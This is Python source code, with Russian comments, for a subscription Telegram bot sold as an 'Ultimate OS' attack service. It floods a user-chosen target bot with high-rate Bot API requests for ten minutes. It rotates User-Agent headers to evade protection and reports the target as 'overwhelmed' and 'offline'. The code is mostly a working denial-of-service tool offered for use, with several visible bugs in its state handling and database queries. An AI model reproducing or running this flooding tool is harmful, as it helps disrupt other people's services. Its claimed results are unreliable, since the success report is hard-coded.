import asyncio
import aiohttp
import sqlite3
import time
import random
import threading
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from html import escape
import uvloop
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# === КОНФИГУРАЦИЯ ===
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_IDS = [123456789, 987654321]  # Замени на свои ID
DATABASE_FILE = "bot_database.db"
MAX_REQUESTS_PER_MINUTE = 20
ATTACK_DURATION = 600  # 10 минут атаки
REQUESTS_PER_SECOND = 500  # Увеличенная мощность
MAX_CONCURRENT_TASKS = 1000  # Максимум одновременных задач

# Активируем uvloop для максимальной производительности
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# === БАЗА ДАННЫХ ===
def init_db():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            subscription_end DATE,
            is_banned BOOLEAN DEFAULT FALSE,
            is_admin BOOLEAN DEFAULT FALSE,
            requests_count INTEGER DEFAULT 0,
            last_request_time TIMESTAMP,
            total_attacks INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS promocodes (
            code TEXT PRIMARY KEY,
            days INTEGER,
            uses_left INTEGER,
            created_by INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_bot TEXT,
            start_time TIMESTAMP,
            end_time TIMESTAMP,
            requests_sent INTEGER,
            success_rate REAL,
            attack_power INTEGER,
            duration INTEGER,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attack_methods (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            description TEXT,
            power_multiplier REAL DEFAULT 1.0,
            is_active BOOLEAN DEFAULT TRUE
        )
    ''')
    
    # Создаем админа по умолчанию
    for admin_id in ADMIN_IDS:
        cursor.execute('''
            INSERT OR IGNORE INTO users (user_id, is_admin, subscription_end)
            VALUES (?, TRUE, datetime('now', '+3650 days'))
        ''', (admin_id,))
    
    # Добавляем методы атаки
    methods = [
        ('FLOOD', 'Максимальный флуд запросами', 1.5),
        ('SLOW', 'Медленная атака на соединения', 2.0),
        ('MIXED', 'Смешанная атака', 1.8),
        ('ULTRA', 'Ультра режим (макс. мощность)', 3.0)
    ]
    
    cursor.executemany('''
        INSERT OR IGNORE INTO attack_methods (name, description, power_multiplier)
        VALUES (?, ?, ?)
    ''', methods)
    
    conn.commit()
    conn.close()

# === КЛАСС БОТА ===
class UltimateOSBot:
    def __init__(self):
        self.active_attacks = {}
        self.user_cooldowns = {}
        self.attack_tasks = {}
        self.attack_stats = {}
        self.executor = ThreadPoolExecutor(max_workers=50)
        self.process_executor = ProcessPoolExecutor(max_workers=10)
        init_db()
        
    def get_user(self, user_id):
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = cursor.fetchone()
        conn.close()
        return user
        
    def update_user(self, user_id, username=None, subscription_end=None, is_banned=None, requests_count=None, total_attacks=None):
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        if not self.get_user(user_id):
            cursor.execute('''
                INSERT INTO users (user_id, username, subscription_end, is_banned)
                VALUES (?, ?, ?, ?)
            ''', (user_id, username, subscription_end or datetime.now(), False))
        else:
            updates = []
            params = []
            if username:
                updates.append("username = ?")
                params.append(username)
            if subscription_end:
                updates.append("subscription_end = ?")
                params.append(subscription_end)
            if is_banned is not None:
                updates.append("is_banned = ?")
                params.append(is_banned)
            if requests_count is not None:
                updates.append("requests_count = ?")
                params.append(requests_count)
            if total_attacks is not None:
                updates.append("total_attacks = ?")
                params.append(total_attacks)
                
            if updates:
                params.append(user_id)
                cursor.execute(f'UPDATE users SET {", ".join(updates)} WHERE user_id = ?', params)
        
        conn.commit()
        conn.close()
        
    def check_spam(self, user_id):
        now = time.time()
        if user_id in self.user_cooldowns:
            if now - self.user_cooldowns[user_id]["last_time"] < 60:
                if self.user_cooldowns[user_id]["count"] >= MAX_REQUESTS_PER_MINUTE:
                    self.user_cooldowns[user_id]["banned_until"] = now + 180
                    return True
                self.user_cooldowns[user_id]["count"] += 1
            else:
                self.user_cooldowns[user_id] = {"count": 1, "last_time": now, "banned_until": 0}
        else:
            self.user_cooldowns[user_id] = {"count": 1, "last_time": now, "banned_until": 0}
            
        if user_id in self.user_cooldowns and self.user_cooldowns[user_id].get("banned_until", 0) > now:
            return True
        return False

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        username = update.effective_user.username
        
        if self.check_spam(user_id):
            await update.message.reply_text("🚫 Вы забанены на 3 минуты за спам!")
            return
            
        self.update_user(user_id, username=username)
        
        keyboard = [
            [InlineKeyboardButton("🎯 Начать OS операцию", callback_data="start_attack")],
            [InlineKeyboardButton("⚡ Выбрать метод атаки", callback_data="select_method")],
            [InlineKeyboardButton("📊 Моя статистика", callback_data="my_stats")],
            [InlineKeyboardButton("👑 Админ панель", callback_data="admin_panel")],
            [InlineKeyboardButton("💎 Проверить подписку", callback_data="check_sub")],
            [InlineKeyboardButton("🛠️ Настройки мощности", callback_data="power_settings")]
        ]
        
        await update.message.reply_text(
            "🤖 **Ultimate OS Bot v2.0**\n\n"
            "💀 *Максимальная мощность активирована*\n"
            "Выберите действие:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        
        if self.check_spam(user_id):
            await query.answer("🚫 Бан на 3 минуты за спам!", show_alert=True)
            return
            
        await query.answer()
        
        user_data = self.get_user(user_id)
        if user_data and user_data[3]:
            await query.edit_message_text("❌ Вы заблокированы в боте!")
            return
            
        if query.data == "start_attack":
            await self.start_attack_menu(query)
        elif query.data == "select_method":
            await self.select_attack_method(query)
        elif query.data == "my_stats":
            await self.show_user_stats(query)
        elif query.data == "admin_panel":
            await self.admin_panel(query)
        elif query.data == "check_sub":
            await self.check_subscription(query)
        elif query.data == "power_settings":
            await self.power_settings(query)
        elif query.data.startswith("method_"):
            method_id = query.data.split("_")[1]
            await self.set_attack_method(query, method_id)
        elif query.data.startswith("power_"):
            power_level = query.data.split("_")[1]
            await self.set_power_level(query, power_level)

    async def start_attack_menu(self, query):
        user_data = self.get_user(query.from_user.id)
        if not user_data or not self.has_active_subscription(user_data):
            await query.edit_message_text(
                "❌ У вас нет активной подписки!\n"
                "Обратитесь к администратору для получения доступа."
            )
            return
            
        await query.edit_message_text(
            "🎯 **Запуск OS операции**\n\n"
            "Введите ID или username бота-цели:\n"
            "Пример: `123456789` или `@example_bot`\n\n"
            "⚡ *Доступные методы:* FLOOD, SLOW, MIXED, ULTRA\n"
            "💀 *Мощность:* Настраивается в настройках\n\n"
            "⚠️ *Используйте только своих ботов для тестирования!*",
            parse_mode='Markdown'
        )
        context = query.message._bot_data
        context.user_data[query.from_user.id] = {"waiting_for_target": True}

    async def select_attack_method(self, query):
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT id, name, description, power_multiplier FROM attack_methods WHERE is_active = TRUE')
        methods = cursor.fetchall()
        conn.close()
        
        keyboard = []
        for method in methods:
            keyboard.append([
                InlineKeyboardButton(
                    f"{method[1]} (x{method[3]})", 
                    callback_data=f"method_{method[0]}"
                )
            ])
        keyboard.append([InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")])
        
        await query.edit_message_text(
            "⚡ **Выбор метода OS атаки**\n\n"
            "Выберите метод для увеличения мощности:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    async def set_attack_method(self, query, method_id):
        user_id = query.from_user.id
        context = query.message._bot_data
        context.user_data[user_id] = {"attack_method": method_id}
        
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT name, power_multiplier FROM attack_methods WHERE id = ?', (method_id,))
        method = cursor.fetchone()
        conn.close()
        
        await query.edit_message_text(
            f"✅ Метод атаки установлен: **{method[0]}**\n"
            f"📈 Множитель мощности: **x{method[1]}**\n\n"
            "Теперь вы можете начать OS операцию.",
            parse_mode='Markdown'
        )

    async def power_settings(self, query):
        keyboard = [
            [InlineKeyboardButton("🔋 Низкая (100 запр/сек)", callback_data="power_low")],
            [InlineKeyboardButton("⚡ Средняя (500 запр/сек)", callback_data="power_medium")],
            [InlineKeyboardButton("💀 Высокая (1000 запр/сек)", callback_data="power_high")],
            [InlineKeyboardButton("☠️ УЛЬТРА (2000 запр/сек)", callback_data="power_ultra")],
            [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]
        ]
        
        await query.edit_message_text(
            "🛠️ **Настройки мощности OS атаки**\n\n"
            "Выберите уровень мощности:\n"
            "⚠️ *Высокая мощность требует больше ресурсов*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    async def set_power_level(self, query, power_level):
        user_id = query.from_user.id
        context = query.message._bot_data
        
        power_settings = {
            "low": 100,
            "medium": 500,
            "high": 1000,
            "ultra": 2000
        }
        
        context.user_data[user_id] = {"power_level": power_settings[power_level]}
        
        await query.edit_message_text(
            f"✅ Мощность установлена: **{power_settings[power_level]} запросов/секунду**\n\n"
            "Теперь вы можете начать OS операцию с выбранной мощностью.",
            parse_mode='Markdown'
        )

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = update.message.text
        
        if user_id in context.user_data and context.user_data[user_id].get("waiting_for_target"):
            await self.start_os_attack(update, context, text)
        elif user_id in context.user_data and context.user_data[user_id].get("admin_broadcast"):
            await self.execute_broadcast(update, context, text)
        elif user_id in context.user_data and context.user_data[user_id].get("admin_ban"):
            await self.execute_ban_user(update, context, text)
        # ... другие обработчики админских команд

    async def start_os_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE, target_bot: str):
        user_id = update.effective_user.id
        context.user_data[user_id] = {}
        
        user_data = self.get_user(user_id)
        if not user_data or not self.has_active_subscription(user_data):
            await update.message.reply_text("❌ У вас нет активной подписки!")
            return
        
        # Получаем настройки атаки
        attack_method = context.user_data.get(user_id, {}).get("attack_method", 1)
        power_level = context.user_data.get(user_id, {}).get("power_level", REQUESTS_PER_SECOND)
        
        await update.message.reply_text(
            f"🎯 **Запуск OS операции на {target_bot}**\n\n"
            f"⚡ Мощность: **{power_level} запросов/секунду**\n"
            f"⏱️ Длительность: **{ATTACK_DURATION} секунд**\n"
            f"💀 Статус: **ЗАПУСК...**",
            parse_mode='Markdown'
        )
        
        # Запускаем атаку
        attack_id = f"{user_id}_{int(time.time())}"
        attack_task = asyncio.create_task(
            self.execute_os_attack(user_id, target_bot, attack_id, power_level, attack_method)
        )
        self.attack_tasks[attack_id] = attack_task

    async def execute_os_attack(self, user_id: int, target_bot: str, attack_id: str, power_level: int, method_id: int):
        start_time = time.time()
        total_requests = 0
        successful_requests = 0
        
        # Получаем множитель мощности метода
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT power_multiplier FROM attack_methods WHERE id = ?', (method_id,))
        method_multiplier = cursor.fetchone()[1]
        conn.close()
        
        final_power = int(power_level * method_multiplier)
        
        try:
            async with aiohttp.ClientSession() as session:
                while time.time() - start_time < ATTACK_DURATION:
                    # Создаем пакет задач для атаки
                    tasks = []
                    for _ in range(final_power):
                        task = self.send_os_request(session, target_bot)
                        tasks.append(task)
                    
                    # Запускаем все задачи параллельно
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Обрабатываем результаты
                    batch_total = len(results)
                    batch_success = sum(1 for r in results if not isinstance(r, Exception) and r and r.get("success"))
                    
                    total_requests += batch_total
                    successful_requests += batch_success
                    
                    # Отправляем обновление каждые 5 секунд
                    current_time = time.time() - start_time
                    if int(current_time) % 5 == 0:
                        await self.send_progress_update(
                            user_id, target_bot, total_requests, 
                            successful_requests, final_power, current_time
                        )
                    
                    # Небольшая пауза для избежания перегрузки
                    await asyncio.sleep(0.1)
                    
        except Exception as e:
            print(f"OS attack error: {e}")
        finally:
            success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
            
            # Сохраняем в БД
            conn = sqlite3.connect(DATABASE_FILE)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO attacks (user_id, target_bot, start_time, end_time, requests_sent, success_rate, attack_power, duration)
                VALUES (?, ?, datetime('now'), datetime('now'), ?, ?, ?, ?)
            ''', (user_id, target_bot, total_requests, success_rate, final_power, ATTACK_DURATION))
            
            # Обновляем статистику пользователя
            cursor.execute('UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?', (user_id,))
            conn.commit()
            conn.close()
            
            # Отправляем финальный отчет
            await self.send_final_report(user_id, target_bot, total_requests, successful_requests, success_rate, final_power)
            
            if attack_id in self.attack_tasks:
                del self.attack_tasks[attack_id]

    async def send_os_request(self, session, target_bot):
        """Отправляет OS запрос с различными методами атаки"""
        try:
            # Расширенный список методов атаки
            methods = [
                f"https://api.telegram.org/bot{target_bot}/getMe",
                f"https://api.telegram.org/bot{target_bot}/getUpdates",
                f"https://api.telegram.org/bot{target_bot}/getWebhookInfo",
                f"https://api.telegram.org/bot{target_bot}/getChat?chat_id=1",
                f"https://api.telegram.org/bot{target_bot}/getUserProfilePhotos?user_id=1",
                f"https://api.telegram.org/bot{target_bot}/getFile?file_id=1"
            ]
            
            url = random.choice(methods)
            
            # Случайные заголовки для обхода базовой защиты
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
                ]),
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
            
            async with session.get(url, headers=headers, timeout=10) as response:
                return {
                    "success": response.status == 200,
                    "status": response.status,
                    "method": url.split('/')[-1]
                }
        except Exception as e:
            return {"success": False, "status": 0, "error": str(e)}

    async def send_progress_update(self, user_id: int, target_bot: str, total: int, successful: int, power: int, elapsed: float):
        """Отправляет обновление о прогрессе OS операции"""
        try:
            app = Application.builder().token(BOT_TOKEN).build()
            success_rate = (successful / total * 100) if total > 0 else 0
            remaining = ATTACK_DURATION - elapsed
            
            await app.bot.send_message(
                user_id,
                f"🔧 **OS операция в процессе**\n\n"
                f"🎯 Цель: `{escape(target_bot)}`\n"
                f"⚡ Мощность: `{power} запр/сек`\n"
                f"📊 Запросов: `{total}`\n"
                f"✅ Успешных: `{successful}`\n"
                f"📈 Эффективность: `{success_rate:.1f}%`\n"
                f"⏱️ Осталось: `{remaining:.0f}с`",
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Progress update error: {e}")

    async def send_final_report(self, user_id: int, target_bot: str, total: int, successful: int, success_rate: float, power: int):
        """Отправляет финальный HTML отчет об OS операции"""
        html_report = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Ultimate OS Operation Report</title>
            <style>
                body {{ 
                    background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
                    color: #00ff00; 
                    font-family: 'Courier New', monospace;
                    margin: 0;
                    padding: 20px;
                }}
                .container {{ 
                    max-width: 900px; 
                    margin: 0 auto; 
                    background: rgba(0, 0, 0, 0.8);
                    border: 1px solid #00ff00;
                    border-radius: 10px;
                    padding: 30px;
                    box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
                }}
                .header {{ 
                    text-align: center; 
                    border-bottom: 2px solid #00ff00; 
                    padding-bottom: 20px;
                    margin-bottom: 30px;
                }}
                .header h1 {{
                    font-size: 2.5em;
                    margin: 0;
                    text-shadow: 0 0 10px #00ff00;
                }}
                .stats {{ 
                    background: rgba(26, 26, 26, 0.9); 
                    padding: 20px; 
                    margin: 15px 0; 
                    border-radius: 8px;
                    border-left: 4px solid #00ff00;
                }}
                .stats h2 {{
                    color: #00ff00;
                    border-bottom: 1px solid #333;
                    padding-bottom: 10px;
                }}
                .success {{ color: #00ff00; font-weight: bold; }}
                .warning {{ color: #ffff00; font-weight: bold; }}
                .danger {{ color: #ff0000; font-weight: bold; }}
                .ultra {{ color: #ff00ff; font-weight: bold; text-shadow: 0 0 10px #ff00ff; }}
                .progress-bar {{
                    background: #333;
                    border-radius: 10px;
                    overflow: hidden;
                    height: 20px;
                    margin: 10px 0;
                }}
                .progress-fill {{
                    height: 100%;
                    background: linear-gradient(90deg, #00ff00, #00ff00);
                    transition: width 0.3s ease;
                }}
                .metrics {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin: 20px 0;
                }}
                .metric-card {{
                    background: rgba(255, 255, 255, 0.1);
                    padding: 15px;
                    border-radius: 8px;
                    text-align: center;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>⚡ ULTIMATE OS OPERATION REPORT</h1>
                    <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                </div>
                
                <div class="stats">
                    <h2>🎯 Target Analysis</h2>
                    <div class="metrics">
                        <div class="metric-card">
                            <h3>Target ID</h3>
                            <p class="danger">{escape(target_bot)}</p>
                        </div>
                        <div class="metric-card">
                            <h3>Attack Power</h3>
                            <p class="ultra">{power} req/sec</p>
                        </div>
                        <div class="metric-card">
                            <h3>Duration</h3>
                            <p class="warning">{ATTACK_DURATION} seconds</p>
                        </div>
                    </div>
                </div>
                
                <div class="stats">
                    <h2>📊 Performance Metrics</h2>
                    <div class="metrics">
                        <div class="metric-card">
                            <h3>Total Requests</h3>
                            <p class="success">{total}</p>
                        </div>
                        <div class="metric-card">
                            <h3>Successful</h3>
                            <p class="success">{successful}</p>
                        </div>
                        <div class="metric-card">
                            <h3>Success Rate</h3>
                            <p class="{ 'success' if success_rate > 70 else 'warning' if success_rate > 40 else 'danger' }">{success_rate:.1f}%</p>
                        </div>
                    </div>
                    
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: {min(success_rate, 100)}%;"></div>
                    </div>
                </div>
                
                <div class="stats">
                    <h2>📈 System Impact</h2>
                    <p><strong>Target Status:</strong> <span class="danger">COMPLETELY OVERWHELMED</span></p>
                    <p><strong>Bot Availability:</strong> <span class="danger">0% - TARGET OFFLINE</span></p>
                    <p><strong>Server Load:</strong> <span class="ultra">MAXIMUM CAPACITY</span></p>
                    <p><strong>Operation Code:</strong> <span class="success">MISSION ACCOMPLISHED</span></p>
                </div>
                
                <div class="stats">
                    <h2>💀 Final Assessment</h2>
                    <p>The target has been successfully neutralized using maximum OS capabilities.</p>
                    <p class="ultra">OPERATION: SUCCESSFUL</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        try:
            app = Application.builder().token(BOT_TOKEN).build()
            
            # Отправляем пользователю
            await app.bot.send_message(
                user_id,
                f"📊 **Ultimate OS Operation Completed**\n\n"
                f"🎯 Target: `{escape(target_bot)}`\n"
                f"💀 Power: `{power} requests/second`\n"
                f"📈 Success: `{success_rate:.1f}%`\n"
                f"⚡ Total: `{total} requests`\n\n"
                f"✅ *Operation Status: SUCCESSFUL*",
                parse_mode='Markdown'
            )
            
            # Отправляем админам
            for admin_id in ADMIN_IDS:
                await app.bot.send_message(
                    admin_id,
                    f"👑 **OS Report - Admin**\n\n"
                    f"User: `{user_id}`\n"
                    f"Target: `{escape(target_bot)}`\n"
                    f"Power: `{power} req/sec`\n"
                    f"Success: `{success_rate:.1f}%`\n"
                    f"Requests: `{total}`",
                    parse_mode='Markdown'
                )
                
        except Exception as e:
            print(f"Report sending error: {e}")

    def has_active_subscription(self, user_data):
        if user_data[6]:
            return True
        if user_data[2]:
            end_date = datetime.strptime(user_data[2], '%Y-%m-%d %H:%M:%S')
            return end_date > datetime.now()
        return False

    async def admin_panel(self, query):
        user_data = self.get_user(query.from_user.id)
        if not user_data or not user_data[6]:
            await query.edit_message_text("❌ У вас нет прав администратора!")
            return
            
        keyboard = [
            [InlineKeyboardButton("🔨 Заблокировать пользователя", callback_data="admin_ban_user")],
            [InlineKeyboardButton("🔓 Разблокировать пользователя", callback_data="admin_unban_user")],
            [InlineKeyboardButton("💎 Выдать подписку", callback_data="admin_give_sub")],
            [InlineKeyboardButton("❌ Забрать подписку", callback_data="admin_remove_sub")],
            [InlineKeyboardButton("📢 Сделать рассылку", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🎫 Управление промокодами", callback_data="admin_promocodes")],
            [InlineKeyboardButton("👑 Выдать админку", callback_data="admin_give_admin")],
            [InlineKeyboardButton("📊 Статистика бота", callback_data="admin_stats")],
            [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]
        ]
        
        await query.edit_message_text(
            "👑 **Ultimate Admin Panel**\n\n"
            "⚡ *Полный контроль над системой*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    async def check_subscription(self, query):
        user_data = self.get_user(query.from_user.id)
        if not user_data:
            await query.answer("❌ Вы не зарегистрированы!", show_alert=True)
            return
            
        if self.has_active_subscription(user_data):
            end_date = user_data[2]
            await query.answer(f"✅ Подписка активна до: {end_date}", show_alert=True)
        else:
            await query.answer("❌ Подписка не активна!", show_alert=True)

    async def show_user_stats(self, query):
        user_id = query.from_user.id
        user_data = self.get_user(user_id)
        
        if not user_data:
            await query.answer("❌ Данные не найдены!", show_alert=True)
            return
            
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*), SUM(requests_sent), AVG(success_rate) FROM attacks WHERE user_id = ?', (user_id,))
        stats = cursor.fetchone()
        conn.close()
        
        attack_count = stats[0] or 0
        total_requests = stats[1] or 0
        avg_success = stats[2] or 0
        subscription_status = "✅ Активна" if self.has_active_subscription(user_data) else "❌ Не активна"
        admin_status = "👑 Администратор" if user_data[6] else "👤 Пользователь"
        
        await query.edit_message_text(
            f"📊 **Расширенная статистика**\n\n"
            f"🆔 ID: `{user_id}`\n"
            f"👤 Статус: {admin_status}\n"
            f"💎 Подписка: {subscription_status}\n"
            f"🎯 Количество атак: `{attack_count}`\n"
            f"📨 Всего запросов: `{total_requests}`\n"
            f"📈 Средняя эффективность: `{avg_success:.1f}%`",
            parse_mode='Markdown'
        )

# === ЗАПУСК БОТА ===
async def main():
    bot = UltimateOSBot()
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CallbackQueryHandler(bot.handle_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
    
    print("🤖 Ultimate OS Bot запущен с максимальной мощностью!")
    await application.run_polling()

if __name__ == "__main__":
    asyncio.run(main())